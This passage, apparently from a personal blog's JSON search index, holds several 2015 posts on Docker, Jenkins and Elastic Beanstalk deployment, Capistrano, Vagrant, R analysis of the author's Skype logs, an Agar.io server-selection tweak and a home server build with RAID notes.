’node’ being the name of my container. This allows me to poke around a running instance. However if my instance crashed, the first thing I do is run docker logs node to see the output that caused my error. If I need to explore the filesystem, I create a snapshot of my container and run it with bash. # find ID of your running container: docker ps # create image (snapshot) from container filesystem docker commit 12345678904b5 mysnapshot # explore this filesystem using bash (for example) docker run -t -i mysnapshot /bin/bash https://stackoverflow.com/questions/20813486/exploring-docker-containers-file-system ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:7:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Dealing with node_modules The node_modules were a huge headache for me. Since I was mounting my pwd onto the container folder, my local node_modules were overwriting the ones in my application. Despite having the same version of node and npm on my local machine as the ones I’m using in my container, my application does not run. A solution would be to delete my local node_modules folder and run npm install in my container, but it is incredibly inconvenient and time consuming to reinstall my node_modules each time I want to start developing. I solved this issue with a symlink. By deleting my local node_modules and creating a node_modules folder symlinked to /core-dist/node_modules, I now do not have a local node_modules folder that points to a real directory, but exists on my Docker container. The idea is to develop solely using the Docker container so the node_modules do not have to be functioning locally. For reference: http://kevzettler.com/programming/2015/06/07/rapid_local_development_vagrant_docker_node.html ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:8:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"IP Issues Across the Local Machine and VM My app had a connection refused error on localhost:3000. This was an annoying one to fix because I haven’t programmed much using Node.js and I spent a good aount of time figuring out if I was facing an issue with virtual machines or with Node.js. The answer is both. My issue was localhost is not the same on the virtual machine as it is on my actual physical machine. My local server did not work because webpackdevserver was operating on localhost and as I said before, localhost on the virtual machine is different from my physical machine’s localhost. The simple fix that took me forever to figure out is to tell it to look at 0.0.0.0 instead of localhost. Connection Refused Fix ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:9:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Developing in Docker Mounting my pwd does not continuously sync the files in the container. It just mounts once and creates the container. This is where Vagrant would have been a viable solution to have files synced in real time to my Docker container as I was developing. However, I found an even better solution here. docker-osx-dev is a GitHub repo that does all of those tasks for you and gives you the ability to sync your local files to docker-machine to your running containers. This way watch tasks and react hotloader work perfectly. My current workflow is to have docker-osx-dev running, rsyncing my files over to my container from my VM. If the install doesn’t work, just run it again until it works (seriously). The errors seem to resolve themselves across the three machines I’ve tested this on. Setting up everything properly for staging and production comes next - http://www.ybrikman.com/writing/2015/11/11/running-docker-aws-ground-up/ ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:10:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Here are some notes I took on how I set up my Jenkins server and deployed my application to Elastic Beanstalk on every git push. ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:0:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"Create new EC2 instance with Ubuntu 14.04 First create a new EC2 instance. For my server I’m using the Ubuntu 14.04 AMI - t2.micro tier Network: my VPC Security group: allowing whitelisted traffic on port 22, 80, and 443. Github’s IP is whitelisted too: 192.30.252.0/22 on ports 22, 80, 443, and 9418 Reference: https://wiki.jenkins-ci.org/display/JENKINS/ http://www.tristanwaddington.com/2012/03/installing-jenkins-on-an-ubuntu-amazon-ec2-instance/ Set up reverse proxy - https://wiki.jenkins-ci.org/display/JENKINS/Running+Jenkins+behind+Apache wget -q -O - https://jenkins-ci.org/debian/jenkins-ci.org.key | sudo apt-key add - sudo sh -c 'echo deb http://pkg.jenkins-ci.org/debian binary/ \u003e /etc/apt/sources.list.d/jenkins.list' sudo apt-get update sudo apt-get install jenkins sudo apt-get install apache2 sudo a2enmod proxy sudo a2enmod proxy_http sudo a2enmod vhost_alias sudo a2dissite 000-default sudo vim /etc/apache2/sites-available/jenkins.conf \u003cVirtualHost *:80\u003e ServerAdmin bchoy@barbariangroup.com ServerName ec2-xxx-xxx-xxx-xxx.us-west-2.compute.amazonaws.com ServerAlias jenkins ProxyRequests Off \u003cProxy *\u003e Order deny,allow Allow from all \u003c/Proxy\u003e ProxyPreserveHost on ProxyPass / http://localhost:8080/ nocanon ProxyPassReverse / http://localhost:8080/ AllowEncodedSlashes NoDecode \u003c/VirtualHost\u003e sudo a2ensite jenkins sudo service apache2 reload sudo apache2ctl restart sudo /etc/init.d/jenkins start Install git and now the Jenkins server should be all set up. sudo apt-get install git ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:1:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"Set up security Manage Jenkins -\u003e Configure Global Security Global Securaity Register a new user under the same username that you created permissions for. Back in AWS you should attach an IAM policy to the security group the app is in to access the S3 bucket and EB deployment permissions. This is my policy: { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"Stmt1446219985300\", \"Action\": [ \"elasticbeanstalk:CreateApplication\", \"elasticbeanstalk:CreateApplicationVersion\", \"elasticbeanstalk:UpdateEnvironment\", \"elasticbeanstalk:DescribeEnvironments\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:elasticbeanstalk:*\" }, { \"Sid\": \"Stmt1446158122885\", \"Action\": [ \"s3:AbortMultipartUpload\", \"s3:CreateBucket\", \"s3:GetBucketAcl\", \"s3:GetBucketCORS\", \"s3:GetBucketLocation\", \"s3:GetBucketLogging\", \"s3:GetBucketNotification\", \"s3:GetBucketPolicy\", \"s3:GetBucketRequestPayment\", \"s3:GetBucketTagging\", \"s3:GetBucketVersioning\", \"s3:GetBucketWebsite\", \"s3:GetLifecycleConfiguration\", \"s3:GetObject\", \"s3:GetObjectAcl\", \"s3:GetObjectTorrent\", \"s3:GetObjectVersion\", \"s3:GetObjectVersionAcl\", \"s3:GetObjectVersionTorrent\", \"s3:ListAllMyBuckets\", \"s3:ListBucket\", \"s3:ListBucketMultipartUploads\", \"s3:ListBucketVersions\", \"s3:ListMultipartUploadParts\", \"s3:PutBucketAcl\", \"s3:PutBucketCORS\", \"s3:PutBucketLogging\", \"s3:PutBucketNotification\", \"s3:PutBucketPolicy\", \"s3:PutBucketRequestPayment\", \"s3:PutBucketTagging\", \"s3:PutBucketVersioning\", \"s3:PutBucketWebsite\", \"s3:PutLifecycleConfiguration\", \"s3:PutObject\", \"s3:PutObjectAcl\", \"s3:PutObjectVersionAcl\", \"s3:RestoreObject\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:s3:::*\" } ] } ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:2:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"Set up GitHub integration Install GitHub plugin, create SSH keys on EC2 Jenkins instance as the jenkins user. Add the keys to GitHub via the reference below. Reference: https://help.github.com/articles/generating-ssh-keys/ Do everything as jenkins user: sudo su -s /bin/bash jenkins Now we can go to Credentials -\u003e Global credentials -\u003e Add Add Global Credentials I left my passphrase blank. For some reason I couldn’t get a passphrase to work. Also now would be a good time to go to your GitHub project page, go to settings, and add a webhook which is your public IP/DNS followed by /github-webhook/. http://ec2-xxx-xxx-xxx-xxx.us-west-2.compute.amazonaws.com/github-webhook/ Manage Webhook ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:3:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"Plugins to Install Hudson Post build task plugin AWS Elastic Beanstalk Deployment Plugin Promoted Builds Plugin S3 publisher plugin Token Macro ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:4:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"Create a build Create new jobs -\u003e Freestyle project Enter the GitHub project URL Tick Promo builds when… and Promote immediately once the build is complete. Add Deploy into AWS Elastic Beanstalk as a build step Promote Builds Appplication name: Elastic Beanstalk application name, not environment name Root Object: . Includes: \\*_/_ Version Label Format: ${GIT_COMMIT}-${BUILD-TAG} Environment name: Under application name Elastic Beanstalk Config I couldn’t get the ${GIT_COMMIT} label to work for no good reason. I guess it’s broken. My solution is to install the Build Name Setter plugin and use the following settings: Set Build Name That way I can tell which of my EB builds applies to which Git commit. ","date":"11-02-2015","objectID":"/posts/deploying-to-elastic-beanstalk-jenkins/:5:0","tags":null,"title":"Deploying to Elastic Beanstalk on git push with Jenkins","uri":"/posts/deploying-to-elastic-beanstalk-jenkins/"},{"categories":null,"content":"After using Docker to deploy last month, I’ve decided to try deploying using Capistrano and nginx for my current project. Helpful links: http://robmclarty.com/blog/how-to-deploy-a-rails-4-app-with-git-and-capistrano https://www.digitalocean.com/community/tutorials/how-to-automate-ruby-on-rails-application-deployments-using-capistrano https://www.phusionpassenger.com/library/walkthroughs/deploy/ruby/ownserver/nginx/oss/precise/deploy_app.html /etc/nginx/sites-enabled/myapp.conf server { listen 80; server_name mydomain.com; # Tell Nginx and Passenger where your app's 'public' directory is root /var/www/myapp/current/public; # Turn on Passenger passenger_enabled on; passenger_ruby /home/bchoy/.rvm/gems/ruby-2.2.3/wrappers/ruby; } Required the following in my Capfile: require 'capistrano/passenger # Restarts Passenger' require 'capistrano/rails/assets # Precompiles assets' require 'capistrano/rvm # Uses RVM' require 'capistrano/bundler # Runs bundle install' deploy.rb precompile assets: # set the locations that we will look for changed assets to determine whether to precompile set :assets_dependencies, %w(app/assets lib/assets vendor/assets Gemfile.lock config/routes.rb) # clear the previous precompile task Rake::Task[\"deploy:assets:precompile\"].clear_actions class PrecompileRequired \u003c StandardError; end # set the locations that we will look for changed assets to determine whether to precompile set :assets_dependencies, %w(app/assets lib/assets vendor/assets Gemfile.lock config/routes.rb) # clear the previous precompile task Rake::Task[\"deploy:assets:precompile\"].clear_actions class PrecompileRequired \u003c StandardError; end namespace :deploy do namespace :assets do desc \"Precompile assets\" task :precompile do on roles(fetch(:assets_roles)) do within release_path do with rails_env: fetch(:rails_env) do begin # find the most recent release latest_release = capture(:ls, '-xr', releases_path).split[1] # precompile if this is the first deploy raise PrecompileRequired unless latest_release latest_release_path = releases_path.join(latest_release) # precompile if the previous deploy failed to finish precompiling execute(:ls, latest_release_path.join('assets_manifest_backup')) rescue raise(PrecompileRequired) fetch(:assets_dependencies).each do |dep| # execute raises if there is a diff execute(:diff, '-Naur', release_path.join(dep), latest_release_path.join(dep)) rescue raise(PrecompileRequired) end info(\"Skipping asset precompile, no asset diff found\") # copy over all of the assets from the last release execute(:cp, '-r', latest_release_path.join('public', fetch(:assets_prefix)), release_path.join('public', fetch(:assets_prefix))) rescue PrecompileRequired execute(:rake, \"assets:precompile\") end end end end end end end Source: https://coderwall.com/p/aridag/only-precompile-assets-when-necessary-rails-4-capistrano-3 ","date":"10-02-2015","objectID":"/posts/using-capistrano-to-deploy-rails-app/:0:0","tags":null,"title":"Using Capistrano to Deploy Rails App","uri":"/posts/using-capistrano-to-deploy-rails-app/"},{"categories":null,"content":"Last week, I deployed a Rails app in a Docker container onto AWS Elastic Beanstalk. It was an unncessarily time consuming task due to small gaps in my knowledge and unfamiliarity with Docker and Elastic Beanstalk. This blog post is written during my first month working as a junior system administrator (“devops”) and this is a recap of my experience to the best of my memory. Super helpful links: https://github.com/phusion/passenger-docker https://intercityup.com/blog/deploy-rails-app-including-database-configuration-env-vars-assets-using-docker.html https://intercityup.com/blog/how-i-build-a-docker-image-for-my-rails-app.html https://rossfairbanks.com/2015/03/06/rails-app-on-docker-using-passenger-image.html Thanks to these blog posts (amongst many others), I was able to cut down a lot of time out of learning how to deploy this rails app. First thing’s first. I installed docker-machine, which is the new boot2docker, and attempted to run my docker image containing the Rails app locally, in production, on my Macbook. Here is the Dockerfile that I used: FROM phusion/passenger-ruby22:0.9.17 MAINTAINER Brian Choy \u003cbycEEE@gmail.com\u003e # Set correct environment variables. ENV HOME /root # Use baseimage-docker's init system. CMD [\"/sbin/my_init\"] # Start Nginx / Passenger RUN rm -f /etc/service/nginx/down # Remove the default site RUN rm /etc/nginx/sites-enabled/default # Add the nginx info ADD nginx.conf /etc/nginx/sites-enabled/webapp.conf # Add the rails-env configuration file ADD rails-env.conf /etc/nginx/main.d/rails-env.conf # Run Bundle in a cache efficient way WORKDIR /tmp ADD Gemfile /tmp/ ADD Gemfile.lock /tmp/ # Add the rails app ADD . /home/app WORKDIR /home/app RUN chown -R app:app /home/app # Run bundle and expose port 80 RUN sudo -u app bundle install --deployment --without test development doc RUN sudo -u app RAILS_ENV=production rake assets:precompile EXPOSE 80 # Clean up RUN apt-get clean \u0026\u0026 rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/* The reason why I used passenger-docker is included on their GitHub. Basically they’re maintaining a Ubuntu 14.04 base image that is tweaked and configured properly for Docker. My nginx.conf: server { listen 80; server_name websiteurl.com; root /home/app/public; passenger_enabled on; passenger_user app; passenger_app_env production; passenger_ruby /usr/bin/ruby2.2; } My rails-env.conf env APP_DB_DATABASE; env APP_DB_HOST; env APP_DB_PASSWORD; env APP_DB_USERNAME; env AWS_ACCESS_KEY_ID; env AWS_SECRET_ACCESS_KEY; env FACEBOOK_APP_ID; env FACEBOOK_APP_SECRET; env SECRET_KEY_BASE; env TWITTER_API_KEY; env TWITTER_API_SECRET; These Rails environment variables are now accessible to me and can be changed via my AWS console. My database also resides in AWS RDS so I did not set up a local MySQL database to connect to. Running my app: docker run --rm -p 80:80 myappname Shell access to my container to poke around for errors: sudo docker exec -i -t 665b4a1e17b6 bash Afterwards just go to your AWS account, spin up another instance of Elastic Beanstalk, add in all your environment variables, and make sure RAILS_ENV is set to production in your environment variables. I’m sure there were way more pain points in this process not mentioned in this blog post and I probably blocked them out of my memory. So far I can relax and be satisfied that this works, but eventually I’ll have to do this again. Will update this blog post or make another one in the future with more info. ","date":"09-14-2015","objectID":"/posts/docker-and-rails-in-production/:0:0","tags":null,"title":"Docker and Rails in Production","uri":"/posts/docker-and-rails-in-production/"},{"categories":null,"content":"Developing on OSX is a dream. I love my Macbook and I love developing on it. However, I’ve always been a PC enthusiast and most of my time is spent on my desktop computer. I stick with Windows as my main operating system when I’m not developing because Linux offers a subpar gaming experience, and my entire music library resides on iTunes, which is not supported on Linux. I have happily turned this computer into a Hackintosh before for a few months when I started out web development, but rather than dual-boot into Linux/OSX, I decided to give virtualization a try. ","date":"07-29-2015","objectID":"/posts/setting-up-a-webdev-environment-on-windows/:0:0","tags":null,"title":"Setting Up a Webdev Environment on Windows","uri":"/posts/setting-up-a-webdev-environment-on-windows/"},{"categories":null,"content":"Why use VMs? Simply put, my Windows machine completely outclasses my Macbook. The screen real estate and dedicated mouse/keyboard really speeds up my development. Futhermore, as a formal avid gamer, I’ve grown very accustomed to Windows and I just prefer to use it as my main OS. Dual booting is a completely viable option, save for the fact that I would have to boot back into Windows to play a game or listen to my music. I already have OSX on my Macbook in case I want to have a dedicated environment, so spinning up a VM seems to be a great choice for my development needs. ","date":"07-29-2015","objectID":"/posts/setting-up-a-webdev-environment-on-windows/:1:0","tags":null,"title":"Setting Up a Webdev Environment on Windows","uri":"/posts/setting-up-a-webdev-environment-on-windows/"},{"categories":null,"content":"Vagrant and Virtualbox Vagrant and VirtualBox are AMAZING. Everyone claims it takes minutes to set up an environment and get started right away with development. It took me about 2 hours because I had no idea what I was doing and couldn’t find a clear guide to set everything up. Plus a virtual environment has some slight kinks to work out versus using a dedicated OS. Getting started is pretty simple. You’ll need to install Vagrant, VirtualBox, and I personally prefer to use MTPuTTY to SSH into my virtual machine. MTPuTTY is a GUI for PuTTY that allows for multiple tabs and automated login. Once you have everything installed, a whole list of Vagrant boxes can be found here. I decided to install the ubuntu/trusty64 box: vagrant init ubuntu/trusty64; vagrant up --provider virtualbox Vagrant Init Here you can see my server running in VirtualBox. Virtualbox Server Your server should now be running! To shut down your server, you can run “vagrant halt” in PowerShell/cmd, and “vagrant up” to run it again. You can SSH into your virtual box using PuTTY with hostname 127.0.0.1 and port 2222. Username/password is vagrant/vagrant. Putty Perfect! We’re now in our environment: Shell in Virtual Environment It was really that easy. We now have a clean environment to work in. There’s a few hurdles I had to go through to get my environment functioning exactly the way I want to. First I wanted to set up a shared folder. Simply go to the folder you ran “vagrant init” in and open up Vagrantfile. Uncomment and alter this line to: config.vm.synced_folder \"shared\", \"/home/vagrant/shared\" Now if you create a folder named “shared” you will now have shared access between your host and guest machines. That way whatever projects you’re working on can be opened locally using Sublime/Atom on your Windows machine can be worked on directly in that folder. You can then use PuTTY to run commands in your VirtualBox environment. Next, to test your application you’d need to forward some ports. In my Vagrantfile again, uncomment and alter this line to: config.vm.network \"forwarded_port\", guest: 3000, host: 3000 This way port 3000 on your guest machine will be forwarded to port 3000 on your host machine and you can locally use your web browser to access your application on that URL. Perfect! Next, configuring the VM to work properly with git. Simply follow the instructions on this article to set up SSH keys. Afterwards, add this to your ~/.profile (Ubuntu uses this instead of bash_profile) to only log in once per box startup. You can look up SSH forwarding if you wish to bypass this and automatically log in. eval `keychain --eval id_rsa` Keychain Now you only have to log in once per startup. Not bad. Now your dev environment is all set up. Just one more note with npm and Vagrant. By default symlinks are disabled to avoid creating symlinks across your VM into your host computer. You can choose to look up enabling symlinks on Vagrant because npm install will give you an error. npm Install Error Alternatively you can run “npm install –no-bin-links” and your packages will install properly. So far I don’t have any problems since I’ve set this up yesterday with my current project using nodejs. I’ll update this blog post or make another one if I come across any other problems running this VM. ","date":"07-29-2015","objectID":"/posts/setting-up-a-webdev-environment-on-windows/:2:0","tags":null,"title":"Setting Up a Webdev Environment on Windows","uri":"/posts/setting-up-a-webdev-environment-on-windows/"},{"categories":null,"content":"Can robots dream? According to Google, they can. Trippy “deep dream” images like this are recently being posted all over the internet. ","date":"07-09-2015","objectID":"/posts/deep-dream/:0:0","tags":null,"title":"Deep Dream","uri":"/posts/deep-dream/"},{"categories":null,"content":"What is deep dream? Google’s image recognition ability is very powerful. Google had become very good at identifying images. Given spicture of a dog, cat, or a bird, Google’s image search will be able to identify the animal properly. The deep dream software uses Google’s image recognition system to identify elements it recognizes, and pronounce it. Basically deep dream is the process of taking an image, finding all known elements of images it recognizes (for example it may associate a shape to a dog), makes that area more dog-like, and feed the results back into itself. After many iterations, the software attempts to make a picture more into the elements it recognizes. Different data-sets produce different results because deep dream is a field of machine learning. Machines learn through the data sets it is given, allowing different patterns to emerge depending on the data set the machine uses to recognize images. There is an excellent guide on /r/deepdream that gives you step by step instructions on how to generate your own deep dream images. The Windows guide is very easy to follow without any programming knowledge. Here is Google’s writeup on neural networks. It’s fascinating stuff. Here is a picture of me run through different layers: Original inception_3a inception_4c inception_5a (40 iterations) inception_4c (GoogLeNet Places 50 iterations) ","date":"07-09-2015","objectID":"/posts/deep-dream/:1:0","tags":null,"title":"Deep Dream","uri":"/posts/deep-dream/"},{"categories":null,"content":"My roommate and I were discussing about how we should create a webapp that tells you who is the better boyfriend/girlfriend in a relationship. This reminded me of a reddit post by /u/Prometheus09. Inspired by what he did with his Whatsapp data, I decided to do the same thing using my Skype logs. My last relationship went from November 2013 to April 2015. Unfortunately my Skype logs start from March 2014, so I’m missing about 4 months worth of data. Still, I had fun doing this and it gave me some insight into our relationship. Here is a relationship in 200,000+ messages over the course of 14 months worth of data. Messages by Month Messages by Hour Since I don’t have much experience with R, I can’t figure out how to organize the months properly. I’ll fix it another day. From these graphs, our Skype conversations are very limited in the winter, going up in the spring, and we talk the most during summer. We also prefer to chat late night from 9PM - 1AM. Words I Said Most to Her Words She Said Most to Me Words Most Said To Each Other This was more interesting to me. First, “lol” and “just” were omitted because they dominated the cloud. Pronouns were also removed and words such as “the.” Unlike most relationships, the word “love” was hardly said. At least we got a good amount of “like” going on for us. My cloud has a lot more negative words associated such as “can’t”, “don’t”, “sorry”, and “whatever.” Her cloud has more positive words, and from our combined cloud, she says my name a lot more than I say hers. At the moment, I don’t really know what I think of this data. I’m also missing Facebook messenger data and text messages. Also there’s the time we spend together in person, which is the most important part of a relationship. I just thought it would be interesting to visually look at this data and look into a relationship from a technical perspective. How was this data obtained? I used R for everything. R is a functional programming language that allows you to explore data sets. I used the ggplot package to create my graphs, tm - text mining package to count my words, and the wordcloud package to create the cloud image. I also used Ruby to clean my Skype logs. First, I used a Skype log viewer to export my Skype logs since Skype’s programming team decided storing conversations in regular .txt files wasn’t a good idea. [1/18/2015 12:07:47 PM] Baby Tuna 🐟: My friends been waiting here an hour [1/18/2015 12:08:05 PM] Brian Choy 🌊: wait at the q50? [1/18/2015 12:08:09 PM] Baby Tuna 🐟: Yea [1/18/2015 12:08:12 PM] Brian Choy 🌊: should i come get you [1/18/2015 12:08:14 PM] Baby Tuna 🐟: No [1/18/2015 12:08:21 PM] Baby Tuna 🐟: It’s bad on the road Great. I now have my logs. Now I have to change all my names to Me/Her. Unfortunately there was no way around checking for every Skype nickname we used and changing all the sender names. I also erased the brackets around the date. 1/18/2015 12:07:47 PM Her: My friends been waiting here an hour 1/18/2015 12:08:05 PM Me: wait at the q50? 1/18/2015 12:08:09 PM Her: Yea 1/18/2015 12:08:12 PM Me: should i come get you 1/18/2015 12:08:14 PM Her: No 1/18/2015 12:08:21 PM Her: It’s bad on the road Now I’m ready to import this data into Microsoft Excel and convert it to a CSV. Import With Delimited Setting Separate by Space Date Format: General Data Imported Clean up all Conversations Afterwards I add a row on the top indicating that each column represents date, time, morning, sender. Row Organisation Unfortunately some “corrupted” data leaks into other rows. Multi-paragraph text and copy\u0026pasted conversations will result in garbage data. Rather than try to sift through all 200,000+ rows, I wrote a Ruby script to take care of this for me. Corrupted Data Ruby Cleanup Script Here I verified each line to follow a valid format. If the row is valid, I write it to a new file. Now I can open up R and plot out my data. With the following code, I import my clean Skype CSV and plot my data for number of messages pe","date":"05-20-2015","objectID":"/posts/visual-data-of-a-relationship-over-a-year/:0:0","tags":null,"title":"Visual Data of a Relationship Over a Year","uri":"/posts/visual-data-of-a-relationship-over-a-year/"},{"categories":null,"content":"Agar.io right now is one of the most popular browser games. You start off as a small blob, eating pieces smaller than you to grow, allowing you to eat other players who have a smaller mass than you. My classmates and I have been playing this game from time to time, however it was pretty difficult to play on the same server. Agar.io allows you to connect to a server in the same region, but you cannot specify which server and you’ll get thrown into a random room. This is incredibly frustrating when you’re trying to play with friends and you have to try over and over again to join the same room as your friends. Good thing we can easily fix this with some jQuery. Notice when opening the console and picking a region, a websocket opens to ws://45.79.193.74:443. This is the IP and port that we want to give our friends. Open Console Now we can create an input box for us to input the ip:port. $(\"#playBtn\").before( \"\u003cinput id='address' class='form-control' placeholder='Enter ip:port (ex. 45.79.194.77:443)' maxlength='19'\u003e\u003c/input\u003e\u003cp\u003e\u003c/p\u003e\" ); We now add a button to connect us to the server. $(\"#playBtn\").before( \"\u003cbutton disabled type='button' id='addressBtn' onclick='connect(\\\"ws://\\\" + $(\\\"#address\\\").val())' class='btn btn-play btn-primary btn-needs-server'\u003eChange Server\u003c/button\u003e\u003cp\u003e\u003c/p\u003e\" ); Voila. Now everyone can connect to the same Agar.io server and play together! Just make sure to type the following jQuery into the console before you pick a region. Connect Prompt $(\"#playBtn\").before( \"\u003cinput id='address' class='form-control' placeholder='Enter ip:port (ex. 45.79.194.77:443)' maxlength='19'\u003e\u003c/input\u003e\u003cp\u003e\u003c/p\u003e\" ); $(\"#playBtn\").before( \"\u003cbutton disabled type='button' id='addressBtn' onclick='connect(\\\"ws://\\\" + $(\\\"#address\\\").val())' class='btn btn-play btn-primary btn-needs-server'\u003eChange Server\u003c/button\u003e\u003cp\u003e\u003c/p\u003e\" ); ","date":"05-14-2015","objectID":"/posts/playing-with-friends-on-agario/:0:0","tags":null,"title":"Playing With Friends on Agar.io","uri":"/posts/playing-with-friends-on-agario/"},{"categories":null,"content":"League of Legends used to be one of my favorite games. One of my practice Rails sites is a LoL stats tracker that lets you look up play stats from RiotGame’s API. Rather than use a gem that does all the work for me, I wrote my own wrapper to practice making my own API calls. Raw Player Data Output The process was fairly simple. I initialized my LeagueWrapper object with my API key that’s stored in Rails secrets.yml. This will refer to the league_api_key variable I have in my secrets.yml. development: league_api_key: Next I follow Riot’s documentation on how to make API calls and use net/http to return the results. And voila! We now have data returned from Riot that we can muck around with and manipulate. I now have retrieved the summoner ID from my friend’s username, Killerbill, and got data from his recent matches. By decoding the JSON retrieved, we can clearly see the data needed to manipulate. Match History Match History JSON From using that data, in my models I can pick out the information I need and save it to my database: Save to Database Code This allows me to store stats such as KDA, or something more interesting such as average gold per game at various times in the game, or performance across multiple game modes. Parsed Match History And there you have it, a simple way to use Riot’s League of Legends API with Rails. ","date":"04-13-2015","objectID":"/posts/writing-a-league-of-legends-api-wrapper/:0:0","tags":null,"title":"Writing a League of Legends API Wrapper","uri":"/posts/writing-a-league-of-legends-api-wrapper/"},{"categories":null,"content":"I noticed people sluggishly using the arrow keys to fix a typo in a terminal command, wasting seconds that add up over time. Here are a couple of keyboard shortcuts I use that increased the quality of life when using the terminal, and allows for speedier in-line navigation. Beginning of line: ⌘← | Send Hex Code | 0x01 End of line: ⌘→ | Send Hex Code | 0x05 Beginning of word: ⌥← | Send Escape Sequence | b End of word: ⌥→ | Send Escape Sequence | f Delete line: ⌘←Delete | Send Hex Code | 0x15 Delete word: ⌥←Delete | Send Hex Code | 0x17 One page up: ⇧⌘↑| Scroll One Page Up One page down: ⇧⌘↓ | Scroll One Page Down ","date":"03-28-2015","objectID":"/posts/iterm2-keyboard-shortcuts/:0:0","tags":null,"title":"iTerm2 Keyboard Shortcuts","uri":"/posts/iterm2-keyboard-shortcuts/"},{"categories":null,"content":"I was around 15 when I started to play around with web and game server hosting. As a result, I became interested in owning my own dedicated server, but my 5mbps down/1mbps up connection did not make me a suitable host. After moving into an apartment where I don’t pay for electricity and has Verizon FIOS, I was able to finally build my own computer and learn how to be a sysadmin. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:0:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Hardware Doubling my main computer as a HTPC and hosting game servers on top of that only led to everyone having an inconsistent experience due to my resources being eaten up whenever I started up a game. Near 100% CPU and RAM utilization isn’t fun for anyone. I decided to build my own (dedicated) server. This was the fun part. Since I have only built gaming rigs in the past, server grade hardware was unexplored territory. I had to research server grade motherboards, NAS drives, ECC RAM, Intel Xeon processors, etc. This was my final build after a week of research: Not bad for an initial start. My goals for this box is to host a couple of game servers (Minecraft, Terraria) and a HTPC server. I had a 120gb SSD I was using to boot OSX on my main computer that was re-purposed as the boot drive to my dedicated. Also, I picked up a 3TB WD RED HDD from somewhere else prior to this order. I was ecstatic when I put my setup together and it ran without any hitches right off the bat. Some stuff that I discovered when doing research on hardware: Intel Xeons E3s are basically i7s that have no onboard graphics, cannot be overclocked, but typically have more cores, and supports ECC RAM. ECC RAM. Never heard of it until I started researching server grade components. Error-correcting code memory (ECC memory) is a type of computer data storage that can detect and correct the most common kinds of internal data corruption. ECC memory is used in most computers where data corruption cannot be tolerated under any circumstances, such as for scientific or financial computing (Wikipedia). Being able to catch and correct errors is very important for data integrity, preventing application crashes, and preventing system crashes. SATA cables and SATA drives work perfectly fine with SAS mobo ports. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:1:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"IPMI IPMI or Intelligent Platform Management Interface is awesome. This is my first time working with an IPMI enabled motherboard, and it made setting up the computer completely painless. I don’t fully understand IPMI, nor do I utilize the majority of its features, but it basically lets me remotely turn on and off my computer over a LAN port. It also allows me full remote control and offers information from hardware sensors (temperatures). The UI isn’t top notch, but the functionality is the important thing. I was able to install my OS over the air and set up my system for SSH instead of relying on the KVM console. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:2:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"SSH Secure Shell (SSH) is a cryptographic network protocol for securing data communication. It establishes a secure channel over an insecure network in a client-server architecture, connecting an SSH client application with a SSH server. Common applications include remote command-line login, remote command execution, but any network service can be secured with SSH. Everything I do to manage my server is through SSH. There would be absolutely no way to control my computer otherwise since it isn’t attached to a screen, keyboard, or mouse. In my simplest explanation, SSH connects you to your computer over any network and allows command line access to it as long as you’re authenticated and have your user permissions set up properly. ","date":"02-08-2015","objectID":"/posts/no-plex-zone/:3:0","tags":null,"title":"No Plex Zone","uri":"/posts/no-plex-zone/"},{"categories":null,"content":"Data Redundancy and File Systems Understanding this and making the right decision took the most time. Hardware research was a distant second. First off, I’m going to discuss RAID very briefly. RAID (originally redundant array of inexpensive disks; now commonly redundant array of independent disks) is a data storage virtualization technology that combines multiple disk drive components into a logical unit for the purposes of data redundancy or performance improvement. Hardware failures happen, and RAID levels greater than 0 are used as fault tolerance to preserve data in the event of hard disk failure. The more popularly used RAID setups are RAID0, RAID1, RAID5, and RAID6. RAID0: Writes to two disks with the goal of speed/performance. If one disk fails, all the data on both disk is lost. RAID1: Mirrors data on two disks. Data is only lost if both disks fail. RAID5: In setups with 3 or more disks, parity is distributed across all disks. One disk will be used to rebuild lost data if a drive fails. All data is lost if two or more drives fail. RAID6: Same as RAID5, but requires a total of four or or more disks, and two disks will be used to rebuild data if a drive fails. All data is lost if three or more drives fail. Because I have 4x 3TB hard drives for my HTPC, RAID5 was the best choice for me. However, the research I’ve done led 